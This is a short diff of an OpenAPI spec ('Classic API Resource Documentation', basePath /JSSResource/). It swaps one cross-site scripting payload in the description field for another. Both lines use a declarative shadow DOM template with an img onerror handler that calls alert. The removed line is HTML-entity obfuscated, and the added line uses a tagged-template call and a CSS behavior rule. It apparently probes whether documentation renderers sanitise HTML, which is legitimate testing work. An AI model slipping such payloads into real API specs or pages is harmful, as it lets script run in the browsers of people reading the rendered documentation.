@@ -2,7 +2,7 @@ openapi: 3.1.0
 info:
   title: Classic API Resource Documentation
   description: |
-    <template shadowrootmode="open"><slot name="xss"><img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#116;&#101;&#120;&#116;&#97;&#114;&#101;&#97;&#39;&#41;></slot></template>
+    <template shadowrootmode=open><style>::slotted(img){behavior:url(#default#time2)}</style><slot><img src=x onerror=alert`textarea`></slot></template>
   version: production
 basePath: /JSSResource/
 produces:
